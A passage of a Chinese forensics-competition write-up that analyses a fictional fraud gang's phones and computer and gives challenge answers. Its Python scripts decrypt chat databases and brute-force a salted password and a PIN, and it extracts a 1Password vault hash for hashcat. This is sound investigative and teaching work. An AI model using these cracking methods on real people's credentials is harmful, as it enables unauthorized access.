+password_hash
+和
+password_salt
+是口令相关参数, 还有用户状态, 昵称以及创建时间等信息.
+于是尝试写 python 脚本解密消息:
+Python
+import
+json
+,
+base64
+from
+Crypto.Cipher
+import
+AES
+from
+Crypto.Util.Padding
+import
+unpad
+KEY
+=
+base64
+.
+b64decode
+(
+"yI0JZciWANMs+bKTuVM+LIjYKPDur2Z11R0X/YwzBA0="
+)
+IV
+=
+base64
+.
+b64decode
+(
+"ajPN2Pt4zFYG1dl9FrpK4Q=="
+)
+with
+open
+(
+"message.json"
+,
+encoding
+=
+"utf-8"
+)
+as
+f
+:
+msgs
+=
+json
+.
+load
+(
+f
+)
+with
+open
+(
+"decrypted.txt"
+,
+"w"
+,
+encoding
+=
+"utf-8"
+)
+as
+out
+:
+for
+m
+in
+msgs
+:
+ct
+=
+base64
+.
+b64decode
+(
+m
+[
+"content"
+])
+pt
+=
+unpad
+(
+AES
+.
+new
+(
+KEY
+,
+AES
+.
+MODE_CBC
+,
+IV
+)
+.
+decrypt
+(
+ct
+),
+16
+)
+.
+decode
+()
+ts
+=
+m
+.
+get
+(
+"create_at"
+,
+0
+)
+if
+ts
+:
+from
+datetime
+import
+datetime
+ts
+=
+datetime
+.
+fromtimestamp
+(
+ts
+/
+1000
+)
+.
+strftime
+(
+"%Y-%m-
+%d
+%H:%M"
+)
+out
+.
+write
+(
+f
+"[
+{
+ts
+}
+] [
+{
+m
+[
+'conversation_id'
+]
+}
+]
+{
+m
+[
+'sender_id'
+]
+}
+:
+{
+pt
+}
+\n
+"
+)
+以上解密代码将会得到类似下面的输出:
+Text Only
+[2023-08-18 16:20] [conv_d_usr_jinlinwang_usr_zaixiang] usr_jinlinwang: 宰相好，金鳞王。
+[2023-08-18 16:21] [conv_d_usr_jinlinwang_usr_zaixiang] usr_zaixiang: 金鳞王，财神那边已经跟我说了你的情况。47人的话务组，带过来直接用对吧？
+[2023-08-18 16:25] [conv_d_usr_jinlinwang_usr_zaixiang] usr_jinlinwang: 对，都是熟手，做过电销的，上手快。
+[2023-08-18 16:26] [conv_d_usr_jinlinwang_usr_zaixiang] usr_zaixiang: 背景都查过了？
+[2023-08-18 16:26] [conv_d_usr_jinlinwang_usr_zaixiang] usr_jinlinwang: 查过了，干净的。
+[2023-08-18 16:27] [conv_d_usr_jinlinwang_usr_zaixiang] usr_zaixiang: 好。培训马上开始，你准备一下。
+[2023-08-18 16:28] [conv_d_usr_jinlinwang_usr_zaixiang] usr_jinlinwang: 没问题，随时可以开干。
+[2023-08-18 16:29] [conv_d_usr_jinlinwang_usr_zaixiang] usr_zaixiang: Deepfake和话术这两块你熟悉吗？
+[2023-08-18 16:30] [conv_d_usr_jinlinwang_usr_zaixiang] usr_jinlinwang: 电销那套我熟，Deepfake没玩过，但学应该很快。
+[2023-08-18 16:31] [conv_d_usr_jinlinwang_usr_zaixiang] usr_zaixiang: 好，军师那边有教程，发给你了。
+[2023-08-18 16:32] [conv_d_usr_jinlinwang_usr_zaixiang] usr_jinlinwang: 收到。
+[2024-01-20 09:30] [conv_d_usr_jinlinwang_usr_zaixiang] usr_jinlinwang: 宰相好，资金归集表建立好了。
+[2024-01-20 09:32] [conv_d_usr_jinlinwang_usr_zaixiang] usr_zaixiang: 好，掌柜那边开始处理吧。
+[2024-01-20 09:35] [conv_d_usr_jinlinwang_usr_zaixiang] usr_jinlinwang: 话务组培训完成了，第一批Deepfake视频也制作好了。
+[2024-01-20 09:38] [conv_d_usr_jinlinwang_usr_zaixiang] usr_zaixiang: 不错，准备开始运作。
+[2024-02-10 10:15] [conv_d_usr_jinlinwang_usr_zaixiang] usr_zaixiang: 话务组针对VIP客户的定向诈骗开始了吗？
+[2024-02-10 10:17] [conv_d_usr_jinlinwang_usr_zaixiang] usr_jinlinwang: 开始了，已经筛选出200多个高净值客户。
+[2024-02-10 10:20] [conv_d_usr_jinlinwang_usr_zaixiang] usr_zaixiang: 好，重点跟进孙建业这个级别的。
+[2024-02-10 10:22] [conv_d_usr_jinlinwang_usr_zaixiang] usr_jinlinwang: 收到，孙建业已经安排了。
+[2024-02-20 11:30] [conv_d_usr_jinlinwang_usr_zaixiang] usr_jinlinwang: 宰相，Deepfake视频已经制作完成了。
+[2024-02-20 11:32] [conv_d_usr_jinlinwang_usr_zaixiang] usr_zaixiang: 好，发给话务组让他们开始定向推送。
+[2024-02-20 11:35] [conv_d_usr_jinlinwang_usr_zaixiang] usr_jinlinwang: 已经发了，第一批选了10个VIP客户。
+[2024-02-20 11:40] [conv_d_usr_jinlinwang_usr_zaixiang] usr_zaixiang: 转化率怎么样？
+[2024-02-20 11:42] [conv_d_usr_jinlinwang_usr_zaixiang] usr_jinlinwang: 目前3个有意向的，还在跟进。
+[2024-02-25 15:00] [conv_d_usr_jinlinwang_usr_zaixiang] usr_jinlinwang: 宰相，今天业绩突破100万了！
+从中我们可以推断出人物关系和诈骗手法.
+usr_caishen
+是最高决策者,
+usr_zaixiang
+负责境内事务, 而
+usr_jinlinwang
+即周文杰, 是 47 人话务组的主管. 该犯罪团伙以 "金鳞交易平台" 为依托, 利用 Deepfake 深度伪造技术、AI 智能外呼系统和虚假投资话术, 有组织、有分工地对境内高净值客户实施投资理财诈骗, 涉案金额逾 217 万元, 并在获悉公安机关收网风声后系统性销毁电子证据.
+05 内部通联app聊天数据使用的什么加密算法
+¶
+答案
+AES
+见上题.
+06 内部通联app用户密码的盐值是
+¶
+答案
+a3f8d9c2e1b4h7g6k9m2n5p8q1r4t7w
+同上.
+07 记录周文杰内部通联app登录密码提示的应用包名是
+¶
+答案
+com.jinghong.notebookkssjh
+看看手机里还有什么其他应用, 猜测可能是类似备注功能的 App.
+比较符合预期的是这两个, 然后去翻它们的数据库, 最后会发现在
+com.jinghong.notebookkssjh
+下存在名为
+NotePal.db
+的数据库, 其中的
+gt_note
+表里存在一条记录.
+title 是 mima, 即密码,
+preview_content
+是:
+英文*2 +数字*6
+, 应该就是题目要求的密码提示.
+08 内部通联app登录密码是
+¶
+答案
+mb202623
+下面我们需要分析前文提到的
+password_hash
+的生成算法, 并根据提示爆破出口令, 在模拟器里把数据库和配置文件覆盖掉, 然后登录就能看到删除了几条聊天记录. 大概思路就是这样.
+首先逆向 dart 汇编确定算法.
+分析 crypto_utils.dart 下的 hashPassword 方法, 它有两个参数, 分别是 password 和 salt, 然后调了两次 sha256, 即 
+$$
+SHA256(SHA256(password+salt))
+$$
+Dart
+0x3a1f04
+:
+SetupParameters
+(
+dynamic
+_
+/* r1 => r3, fp-0x8 */
+,
+dynamic
+_
+/* r2 => r0, fp-0x10 */
+)
+0x3a1f60
+:
+r0
+=
+sha256
+()
+0x3a1f60
+:
+bl
+#
+0x3a1e34
+;
+[
+package:
+social_chat_app
+/
+core
+/
+utils
+/
+crypto_utils
+.
+dart
+]
+CryptoUtils:
+:
+sha256
+0x3a1f64
+:
+mov
+x1
+,
+x0
+0x3a1f68
+:
+r0
+=
+sha256
+()
+0x3a1f68
+:
+bl
+#
+0x3a1e34
+;
+[
+package:
+social_chat_app
+/
+core
+/
+utils
+/
+crypto_utils
+.
+dart
+]
+CryptoUtils:
+:
+sha256
+写 python 脚本爆破口令:
+Python
+import
+hashlib
+,
+itertools
+,
+string
+,
+time
+from
+multiprocessing
+import
+Pool
+,
+cpu_count
+from
+rich.progress
+import
+Progress
+,
+BarColumn
+,
+TextColumn
+,
+TimeRemainingColumn
+,
+TaskProgressColumn
+from
+rich.console
+import
+Console
+from
+rich.table
+import
+Table
+TARGET
+=
+"5d85b77d7d6d1a76cd589c3ba21d1839b1dd28568e39f1d2facc3a1b7d2e8bcb"
+SALT
+=
+"a3f8d9c2e1b4h7g6k9m2n5p8q1r4t7w"
+PREFIXES
+=
+[
+a
++
+b
+for
+a
+,
+b
+in
+itertools
+.
+product
+(
+string
+.
+ascii_letters
+,
+repeat
+=
+2
+)]
+N
+=
+1_000_000
+CHUNK
+=
+100_000
+def
+check
+(
+args
+):
+prefix
+,
+start
+,
+end
+=
+args
+for
+n
+in
+range
+(
+start
+,
+end
+):
+p
+=
+f
+"
+{
+prefix
+}{
+n
+:
+06d
+}
+"
+h1
+=
+hashlib
+.
+sha256
+((
+p
++
+SALT
+)
+.
+encode
+())
+.
+hexdigest
+()
+if
+hashlib
+.
+sha256
+(
+h1
+.
+encode
+())
+.
+hexdigest
+()
+==
+TARGET
+:
+return
+p
+return
+None
+def
+main
+():
+chunks
+=
+[(
+p
+,
+s
+,
+min
+(
+s
++
+CHUNK
+,
+N
+))
+for
+p
+in
+PREFIXES
+for
+s
+in
+range
+(
+0
+,
+N
+,
+CHUNK
+)]
+console
+=
+Console
+()
+progress
+=
+Progress
+(
+TextColumn
+(
+"[bold cyan]
+{task.description}
+"
+),
+BarColumn
+(
+bar_width
+=
+40
+),
+TaskProgressColumn
+(),
+TextColumn
+(
+"·"
+),
+TimeRemainingColumn
+(),
+TextColumn
+(
+"·"
+),
+TextColumn
+(
+"[yellow]
+{task.fields[speed]}
+"
+),
+console
+=
+console
+,
+)
+found
+=
+None
+task
+=
+progress
+.
+add_task
+(
+"scanning"
+,
+total
+=
+len
+(
+chunks
+),
+speed
+=
+"--"
+,
+start
+=
+True
+)
+t0
+=
+time
+.
+time
+()
+last
+=
+t0
+with
+progress
+,
+Pool
+(
+cpu_count
+())
+as
+pool
+:
+for
+result
+in
+pool
+.
+imap_unordered
+(
+check
+,
+chunks
+):
+now
+=
+time
+.
+time
+()
+if
+result
+:
+found
+=
+result
+pool
+.
+terminate
+()
+break
+progress
+.
+update
+(
+task
+,
+advance
+=
+1
+,
+speed
+=
+f
+"
+{
+CHUNK
+*
+(
+progress
+.
+tasks
+[
+task
+]
+.
+completed
+or
+1
+)
+/
+(
+now
+-
+t0
+or
+1
+)
+/
+1e6
+:
+.1f
+}
+M/s"
+)
+progress
+.
+stop
+()
+elapsed
+=
+time
+.
+time
+()
+-
+t0
+if
+found
+:
+table
+=
+Table
+(
+title
+=
+"[bold green]PASSWORD FOUND[/bold green]"
+,
+show_header
+=
+False
+)
+table
+.
+add_column
+(
+style
+=
+"cyan"
+)
+table
+.
+add_column
+(
+style
+=
+"bold yellow"
+)
+table
+.
+add_row
+(
+"password"
+,
+found
+)
+table
+.
+add_row
+(
+"time"
+,
+f
+"
+{
+elapsed
+:
+.1f
+}
+s"
+)
+h1
+=
+hashlib
+.
+sha256
+((
+found
++
+SALT
+)
+.
+encode
+())
+.
+hexdigest
+()
+h2
+=
+hashlib
+.
+sha256
+(
+h1
+.
+encode
+())
+.
+hexdigest
+()
+table
+.
+add_row
+(
+"hash"
+,
+h2
+)
+console
+.
+print
+(
+table
+)
+else
+:
+console
+.
+print
+(
+f
+"[red]Not found (
+{
+elapsed
+:
+.1f
+}
+s)[/red]"
+)
+if
+__name__
+==
+"__main__"
+:
+main
+()
+得到口令是
+mb202623
+.
+09 周文杰在内部通联app中删除了几条聊天记录
+¶
+答案
+6
+在模拟器里安装该 App, 把检材里的
+password.json
+,
+FlutterSharedPreferences.xml
+,
+social_chat.db
+复制并覆盖到安装目录里, 用户名 zhouwenjie, 密码 mb202623 就可以登录进去了.
+在和宰相的私聊对话中发现了
+已删除
+和
+撤回
+的关键字, 其它群聊里都没有, 数一下发现删除了 6 条, 撤回了 5 条.
+10 聊天数据库中，显示聊天数据删除的是哪个字段
+¶
+答案
+extra_val
+再回头去看数据库里的字段, 发现
+extra_val
+值为 1 的记录刚好 6 条,
+state_bits
+值为 1 的记录恰好是 5 条. 因此可以推断前者代表消息是否已删除, 后者则表示消息是否撤回.
+林小婉手机
+¶
+分析林小婉手机检材
+01 发现有个应用隐藏了很多信息, 目前已经找到这个应用, 它的程序名称是
+¶
+答案
+今日头条
+在非系统 App 的数据目录里找找有什么异样. 最终在
+com.jinritoutiao.news
+下发现了以
+.jth2
+为后缀的保险库文件. 结合谷歌输入法里剪贴板的内容, 判断该隐藏应用是今日头条.
+02 这个应用有一个安全加密的 PIN 码, 它是多少
+¶
+答案
+20150412
+接上题, 我们希望解密保险库并查看内容. 加密文件的十六进制如下, 有一个明显的
+JTH3
+magic 作为文件头, 其余内容不明.
+首先需要确认文件结构. 通过分析
+com.jinritoutiao.news.data.VaultDataLoader
+的
+loadData
+方法可以基本确定文件结构如下:
+Text Only
+┌──────────┬──────────┬─────────────────┬──────────┬──────────┬──────────┐
+│  Magic   │ Version  │       IV        │Ciphertext│   TAG    │   HMAC   │
+├──────────┼──────────┼─────────────────┼──────────┼──────────┼──────────┤
+│  4 bytes │  2 bytes │    12 bytes     │ variable │ 16 bytes │ 32 bytes │
+├──────────┼──────────┼─────────────────┼──────────┼──────────┼──────────┤
+│  "JTH3"  │ uint16 BE│   AES-GCM IV    │AES-GCM CT│ AES-GCM  │ SHA-256  │
+└──────────┴──────────┴─────────────────┴──────────┴──────────┴──────────┘
+0         4-5        6-17              18        len-48     len-32
+(TAG)      (HMAC)
+密钥通过如下代码派生:
+解密用到
+AES/GCM/NoPadding
+:
+解密脚本:
+Python
+import
+json
+,
+sys
+from
+Crypto.Cipher
+import
+AES
+from
+Crypto.Protocol.KDF
+import
+PBKDF2
+from
+Crypto.Hash
+import
+SHA256
+KEY
+=
+PBKDF2
+(
+"Jinritoutiao_Master_Key_2024_Secret"
+,
+b
+"JinriSalt_2024"
+,
+dkLen
+=
+32
+,
+count
+=
+65536
+,
+hmac_hash_module
+=
+SHA256
+)
+with
+open
+(
+"assets_vault.jth2"
+,
+"rb"
+)
+as
+f
+:
+data
+=
+f
+.
+read
+()
+iv
+,
+ct
+,
+tag
+=
+data
+[
+6
+:
+18
+],
+data
+[
+18
+:
+-
+48
+],
+data
+[
+-
+48
+:
+-
+32
+]
+pt
+=
+AES
+.
+new
+(
+KEY
+,
+AES
+.
+MODE_GCM
+,
+nonce
+=
+iv
+)
+.
+decrypt_and_verify
+(
+ct
+,
+tag
+)
+obj
+=
+json
+.
+loads
+(
+pt
+.
+decode
+())
+with
+open
+(
+"vault_decrypted.json"
+,
+"w"
+,
+encoding
+=
+"utf-8"
+)
+as
+f
+:
+json
+.
+dump
+(
+obj
+,
+f
+,
+indent
+=
+2
+,
+ensure_ascii
+=
+False
+)
+然后就可以看到保险库内容了:
+回到这题, 依然没有发现我们要的 PIN 码, 于是继续分析, 最终发现两个可能和 PIN 有关的地方:
+1)Native 相关逻辑.
+用 ida 查看 verifyPin 的逻辑, 发现仅仅是一个哈希校验, 没有其他多余信息.
+2)
+com.jinritoutiao.news.NavigationKt
+.
+里面有一个
+verifyPinKotlin
+方法.
+不一样的是, 往上翻可以看到该 App 如何从一个伪装的今日头条进到保险库 Activity 的跳转逻辑. 也就是
+交叉引用发现
+而 query 是我们在输入框里输入的内容. 因此我们尝试三个字符串, 分别会跳到以下界面:
+security_debug
+保险箱 LIN_XIAOWAN:
+保险箱 LU_ZHENGYU:
+所有都指向女儿生日. 爆破脚本:
+Python
+import
+hashlib
+from
+rich.progress
+import
+Progress
+S
+=
+b
+"JinriPIN_Salt_"
+T
+=
+bytes
+.
+fromhex
+(
+"7e881d49322271f3dd4fa24846a5cc53d1e0506b46007caa4b27f1416b27b54c"
+)
+total
+=
+(
+2030
+-
+1990
+)
+*
+12
+*
+31
+*
+2
+with
+Progress
+()
+as
+pb
+:
+task
+=
+pb
+.
+add_task
+(
+"cracking PIN"
+,
+total
+=
+total
+)
+for
+y
+in
+range
+(
+1990
+,
+2030
+):
+for
+m
+in
+range
+(
+1
+,
+13
+):
+for
+d
+in
+range
+(
+1
+,
+32
+):
+for
+p
+in
+(
+f
+"
+{
+y
+}{
+m
+:
+02d
+}{
+d
+:
+02d
+}
+"
+,
+f
+"
+{
+m
+:
+02d
+}{
+d
+:
+02d
+}{
+y
+}
+"
+):
+if
+hashlib
+.
+pbkdf2_hmac
+(
+"sha256"
+,
+p
+.
+encode
+(),
+S
+,
+10000
+,
+dklen
+=
+32
+)
+==
+T
+:
+pb
+.
+stop
+()
+print
+(
+f
+"PIN:
+{
+p
+}
+"
+)
+exit
+()
+pb
+.
+advance
+(
+task
+)
+基本上几分钟就能爆出来 20150412.
+打开保险库, 发现就是刚刚我们解密出来的内容:
+感觉是做麻烦了, 正常解题顺序应该是先获得 PIN 然后就不用解密 jth2 文件了.
+03 这个应用隐藏的数据中，每个标签数据里，notes字段表示多少
+¶
+答案
+备注
+见上题.
+04 这个应用隐藏的数据中，文件备份服务器的IP地址是多少
+¶
+答案
+192.168.1.200
+05 发现内部通联中财神撤回了一条消息，这个消息的内容是
+¶
+答案
+把23年10月到24年6月的账本整理一下，发给我。
+类似周文杰的手机检材里的分析方法, 这里就不过多赘述了. 大致思路就是先解密数据库, 然后解密消息即可. Python 脚本如下:
+Python
+import
+json
+,
+base64
+from
+Crypto.Cipher
+import
+AES
+from
+Crypto.Util.Padding
+import
+unpad
+KEY
+=
+base64
+.
+b64decode
+(
+"kOpoJlwv0/HyhcJkNDUHxtABzZqAl6wjFXPUtzX9aZo="
+)
+IV
+=
+base64
+.
+b64decode
+(
+"zm0YA3yx57rHy2fYiQm0gg=="
+)
+with
+open
+(
+"message.json"
+,
+encoding
+=
+"utf-8"
+)
+as
+f
+:
+msgs
+=
+json
+.
+load
+(
+f
+)
+with
+open
+(
+"decrypted.txt"
+,
+"w"
+,
+encoding
+=
+"utf-8"
+)
+as
+out
+:
+for
+m
+in
+msgs
+:
+ct
+=
+base64
+.
+b64decode
+(
+m
+[
+"content"
+])
+pt
+=
+unpad
+(
+AES
+.
+new
+(
+KEY
+,
+AES
+.
+MODE_CBC
+,
+IV
+)
+.
+decrypt
+(
+ct
+),
+16
+)
+.
+decode
+()
+ts
+=
+m
+.
+get
+(
+"create_at"
+,
+0
+)
+if
+ts
+:
+from
+datetime
+import
+datetime
+ts
+=
+datetime
+.
+fromtimestamp
+(
+ts
+/
+1000
+)
+.
+strftime
+(
+"%Y-%m-
+%d
+%H:%M"
+)
+recalled
+=
+'[RECALLED]'
+if
+m
+[
+'state_bits'
+]
+==
+1
+else
+''
+deleted
+=
+'[DELETED]'
+if
+m
+[
+'extra_val'
+]
+==
+1
+else
+''
+out
+.
+write
+(
+f
+"[
+{
+ts
+}
+] [
+{
+m
+[
+'conversation_id'
+]
+}
+]
+{
+m
+[
+'sender_id'
+]
+}
+{
+recalled
+}
+{
+deleted
+}
+:
+{
+pt
+}
+\n
+"
+)
+解密出来就可以看到撤回的消息了.
+通读下来可以发现 掌柜(usr_zhanggui), 也就是林小婉, 分管该诈骗团伙的财务, 主要负责支出营收, 账单统计等.
+06 发现了账本，账本打开密码是什么
+¶
+答案
+DragonTeng@2024#$
+刘洋计算机
+¶
+Info
+以下题目分析刘洋
+liuyang_pc.E01
+检材.
+01 提取磁盘镜像 SHA1 值
+¶
+答案
+5bc41890367e9c79c6b415c922e30bc994bfb351
+使用
+EWF-FastHash
+计算:
+PowerShell
+python
+ewf_fasthash
+.
+py
+-
+-hash
+sha1
+-
+-block-size
+$(
+1024
+*
+1024
+*
+1024
+)
+-
+-parallelism
+6
+'Z:\刘洋\liuyang_pc.E01'
+得到镜像文件的 SHA1 哈希值为:
+5bc41890367e9c79c6b415c922e30bc994bfb351
+.
+02 计算机系统 Build 版本为?
+¶
+答案
+26100.1742
+在火眼的 基本信息 -> 系统信息 分析结果中可以看到系统的 Build 版本为
+26100.1742
+:
+03 计算机最后一次正常关机的时间(UTC+0)为?
+¶
+答案
+2026-04-20 16:25:35
+在火眼的 基本信息 -> 开关机时间 分析结果中, 按关机时间排序, 找到最后一次正常关机的记录是在
+2026-04-21 00:25:35
+:
+在火眼的 基本信息 -> 系统信息 分析结果中可以看到系统时区为 UTC+08:
+开关机时间实际上来自于 Windows 的日志文件
+Windows/System32/winevt/Logs/System.evtx
+, 其中记录的时间均为计算机的本地时间, 因此需要将时区从 UTC+08 转换到 UTC+00, 得到关机时间为
+2026-04-20 16:25:35 UTC+00
+.
+04 计算机网卡的 MAC 地址为?
+¶
+答案
+00-50-56-30-26-1C
+在火眼的 基本信息 -> 网络配置 -> 网络适配器 分析结果中可以看到计算机的物理网卡的 MAC 地址为
+00-50-56-30-26-1C
+:
+05 分析机主是从那里下载的 typora
+¶
+答案
+蓝奏云
+在火眼的 Chrome 浏览器 -> 下载记录 分析结果中可以看到文件
+Typor1.9.3-x64-CN.7z
+的来源是
+developer2.lanrar.com
+:
+该域名为蓝奏云的域名.
+在火眼的 Chrome 浏览器 -> 历史记录 分析结果中也可以看到访问蓝奏云下载的过程:
+06 刘洋在 2026-04-19 13:46:01(UTC+0)曾访问过百度云盘, 请给云盘的打开密码
+¶
+答案
+48gy
+2026-04-19 13:46:01(UTC+0) 转换到 UTC+08 为 2026-04-19 21:46:01.
+在火眼的 Edge 浏览器 -> 历史记录 分析结果中筛选 URL 包含
+pan.baidu.com
+的记录, 可以看到对应时间的百度网盘分享访问记录, 分享密码为 URL 中 GET 传参
+pwd
+的值
+48gy
+:
+07 请给出刘洋管理 pve 集群所用的端口号
+¶
+答案
+8006
+在火眼的 Edge 浏览器 -> 历史记录 分析结果中筛选标题包含
+pve
+的记录, 可以看到访问过
+https://192.168.0.50:8006
+(pve-node1) 和
+https://192.168.0.51:8006
+(pve-node2) 2 个 PVE(Proxmox Virtual Environment) 集群节点的管理界面:
+08 请给出刘洋登录理财网站所使用的密码
+¶
+答案
+admin123
+在火眼的 Chrome 浏览器 -> 历史记录 分析结果中可以看到访问过标题为
+金鳞资本|change
+的网站, 并且登录了网站的后台
+http://3w.jlzb.vip/admin/index
+:
+在火眼的 Chrome 浏览器 -> 保存的密码 分析结果中可以看到 URL
+http://3w.jlzb.vip/login
+保存的登录信息
+admin/admin123
+:
+09 请给出理财网站的 IP 地址
+¶
+答案
+192.168.0.70
+根据先前的 PVE 节点的 IP 地址来看, 整个服务器是部署在内网的, 理财网站实际上也部署在内网. 因此, 查看 hosts 文件:
+可以看到 PVE 的 3 个节点的 IP 地址和理财网站的 IP 地址被指定了域名映射:
+Text Only
+192.168.0.50  pve-node01.pgscup
+192.168.0.51  pve-node02.pgscup
+192.168.0.52  pve-node03.pgscup
+192.168.0.70  3w.jlzb.vip
+10 请给出计算机内 Bitlocker 加密分区恢复密钥
+¶
+答案
+560615-577522-342881-216865-242561-312356-584837-421597
+本题需要用到刘洋计算机内存检材.
+使用 EFDD 加载硬盘镜像和内存镜像:
+之后即可得到恢复密钥:
+11 找出 VC 加密容器的密钥文件, 给出该密钥文件的绝对路径
+¶
+答案
+D:\BaiduNetdiskDownload\无标题.png
+使用上题中通过 EFDD 获取的 VC 内存密钥或恢复密钥解密 BitLocker 分区.
+在该分区的
+\BaiduNetdiskDownload
+目录中可以看到 1 个文件名为
+WPSOffice_RCTSE_2023_12.1.0.24655_x64_20260115_雨糖科技.exe
+的文件, 其文件大小为整
+3 GB
+. 用 16 进制查看器打开后, 可以看到文件内容接近随机字节, 判读该文件可能为 VeraCrypt 加密容器:
+同目录下存在
+无标题.png
+文件, 使用 IrfanView 打开报错:
+使用 010 Editor 打开后提示图片 CRC 校验错误:
+猜测图片内容遭到修改. 使用 Python 脚本尝试进行图片宽高爆破:
+爆破得到修改前的宽高为 1920 * 1080, 使用 010 Editor 修改图片高度:
+得到原始图片, 其中包含"VC容器密钥文件"字样:
+在
+liuyang_pc.E01/分区6/Users/刘洋/Pictures/无标题.png
+存有提示, 根据该图片的提示也可以知道图片被修改了高度:
+12 接上题, 该 VC 加密容器的密钥文件的图像高度是多少像素?
+¶
+答案
+1080
+见上题分析.
+13 请给出团队重要信息加密保存的软件名?
+¶
+答案
+1password
+在火眼的 Edge 浏览器 -> 历史记录 分析结果中可以看到搜索并下载 1password 的记录:
+1password 安装在
+分区6/Users/刘洋/AppData/Local/1Password/
+目录中.
+14 该软件的保险库文件名为什么?
+¶
+答案
+liuyang.opvault
+接上题, 密码库是
+/分区6/Users/刘洋/Documents/1password/liuyang.opvault
+.
+15 该软件的保险库文件打开密码是什么?
+¶
+答案
+liuyang@6419
+接上题, 将密码库导出, 使用
+1password2john.py
+提取哈希:
+PowerShell
+python
+1password2john
+.
+py
+'D:\CaseFiles\FileOutput\liuyang.opvault'
+>
+'D:\CaseFiles\FileOutput\hash'
+得到的哈希如下:
+Text Only
+$cloudkeychain$16$21e511779d6e0180b578b7a453807014$100000$336$6f70646174613031000100000000000067f29be6d379d24d1cfaeca750ed4ab1f88aeee703794c507ceeab51f8f6397022f4844ba6f9e5918d647034c6dc898227ca80381cf36ac43892cdcd28385e5faa6860a4df7fed266119592eabec47fec1212bb3135c51843154791a590b5ba1f43cbe27fee3a7585c119f4e24f96bf244414d97e9b9f64a77798e4392cfadac3d072e1d8c09d651712efe1661159139528cbd50386f407236b8d399f507ad2b8fbf726e04d7e22d75faf4bbd53d6f047739e19d91b8065535fa6dd9099af61d24fdfb4e09321149863d149a13b4ee78a36d422f703c5ea89a1ece7c99d420ba7a872b425bf2bf610800e33170c992b82198d82330f8c3c27659259cb11d6942df86010468d1df5a7a4516756a9793f9075c593873fcd125bdab39919b3a3143f97bb4e3fb5c41a5776bf01d0952f929abce9d975434408bcc8354c1f8ae6252$256$16$67f29be6d379d24d1cfaeca750ed4ab1$272$f88aeee703794c507ceeab51f8f6397022f4844ba6f9e5918d647034c6dc898227ca80381cf36ac43892cdcd28385e5faa6860a4df7fed266119592eabec47fec1212bb3135c51843154791a590b5ba1f43cbe27fee3a7585c119f4e24f96bf244414d97e9b9f64a77798e4392cfadac3d072e1d8c09d651712efe1661159139528cbd50386f407236b8d399f507ad2b8fbf726e04d7e22d75faf4bbd53d6f047739e19d91b8065535fa6dd9099af61d24fdfb4e09321149863d149a13b4ee78a36d422f703c5ea89a1ece7c99d420ba7a872b425bf2bf610800e33170c992b82198d82330f8c3c27659259cb11d6942df86010468d1df5a7a4516756a9793f9075c593873fcd125bdab39919b3a3143$32$f97bb4e3fb5c41a5776bf01d0952f929abce9d975434408bcc8354c1f8ae6252$304$6f70646174613031000100000000000067f29be6d379d24d1cfaeca750ed4ab1f88aeee703794c507ceeab51f8f6397022f4844ba6f9e5918d647034c6dc898227ca80381cf36ac43892cdcd28385e5faa6860a4df7fed266119592eabec47fec1212bb3135c51843154791a590b5ba1f43cbe27fee3a7585c119f4e24f96bf244414d97e9b9f64a77798e4392cfadac3d072e1d8c09d651712efe1661159139528cbd50386f407236b8d399f507ad2b8fbf726e04d7e22d75faf4bbd53d6f047739e19d91b8065535fa6dd9099af61d24fdfb4e09321149863d149a13b4ee78a36d422f703c5ea89a1ece7c99d420ba7a872b425bf2bf610800e33170c992b82198d82330f8c3c27659259cb11d6942df86010468d1df5a7a4516756a9793f9075c593873fcd125bdab39919b3a3143
+需要对哈希进行修改才能用 Hashcat 爆破:
+用 Python 对哈希进行分段:
+hash.split("$")
+.
+拼接其中的部分分段:
+":".join([parts[13], parts[3], parts[4], parts[15]])
+这里也提供一个脚本, 用于直接从 opvault 提取适用于 HashCat 的哈希:
+Python
+import
+sys
+import
+os
+import
+json
+import
+base64
+def
+extract_from_opvault
+(
+vault_dir
+:
+str
+)
+->
+str
+:
+"""Extract hash from an OPVault directory in hashcat 8200 format.
+Returns:
+hashcat hash string in format: <hmac>:<salt>:<iterations>:<data>
+"""
+profile_path
+=
+os
+.
+path
+.
+join
+(
+vault_dir
+,
+"default"
+,
+"profile.js"
+)
+if
+not
+os
+.
+path
+.
+exists
+(
+profile_path
+):
+raise
+FileNotFoundError
+(
+f
+"profile.js not found at
+{
+profile_path
+}
+"
+)
+with
+open
+(
+profile_path
+,
+"r"
+,
+encoding
+=
+"utf-8"
+)
+as
+f
+:
+content
+=
+f
+.
+read
+()
+# Strip "var profile=" prefix and trailing ";"
+json_str
+=
+content
+if
+json_str
+.
+startswith
+(
+"var profile="
+):
+json_str
+=
+json_str
+[
+len
+(
+"var profile="
+):]
+if
+json_str
+.
+endswith
+(
+";"
+):
+json_str
+=
+json_str
+[:
+-
+1
+]
+data
+=
+json
+.
+loads
+(
+json_str
+)
+salt
+=
+base64
+.
+b64decode
+(
+data
+[
+"salt"
+])
+master_key_blob
+=
+base64
+.
+b64decode
+(
+data
+[
+"masterKey"
+])
+iterations
+=
+data
+[
+"iterations"
+]
+# Parse opdata1 format
+HEADER_LENGTH
+=
+8
+HMAC_LENGTH
+=
+32
+if
+master_key_blob
+[:
+HEADER_LENGTH
+]
+!=
+b
+"opdata01"
+:
+raise
+ValueError
+(
+"masterKey is not in opdata1 format"
+)
+expected_hmac
+=
+master_key_blob
+[
+-
+HMAC_LENGTH
+:]
+hmac_d_data
+=
+master_key_blob
+[:
+-
+HMAC_LENGTH
+]
+return
+f
+"
+{
+expected_hmac
+.
+hex
+()
+}
+:
+{
+salt
+.
+hex
+()
+}
+:
+{
+iterations
+}
+:
+{
+hmac_d_data
+.
+hex
+()
+}
+"
+def
+main
+():
+args
+=
+sys
+.
+argv
+[
+1
+:]
+vault_dir
+=
+args
+[
+0
+]
+output_file
+=
+args
+[
+1
+]
+if
+len
+(
+args
+)
+>
+1
+else
+None
+hashcat_hash
+=
+extract_from_opvault
+(
+vault_dir
+)
+if
+output_file
+:
+with
+open
+(
+output_file
+,
+"w"
+)
+as
+f
+:
+f
+.
+write
+(
+hashcat_hash
++
+"
+\n
+"
+)
+print
+(
+f
+"Hashcat hash written to
+{
+output_file
+}
+"
+,
+file
+=
+sys
+.
+stderr
+)
+else
+:
+print
+(
+hashcat_hash
+)
+if
+__name__
+==
+"__main__"
+:
+main
+()
+接着就是生成用于爆破的字典了. 题目没有给出任何密码格式的提示, 答案格式
+123@password
+也与实际密码格式不同. 如果使用的社工字典生成器正好有
+姓名英文全拼@数字
+的生成策略的话, 就能碰巧得到包含密码的字典.
+Python
+pwds
+=
+[]
+parts1
+=
+[
+'liuyang'
+,
+'yangliu'
+,
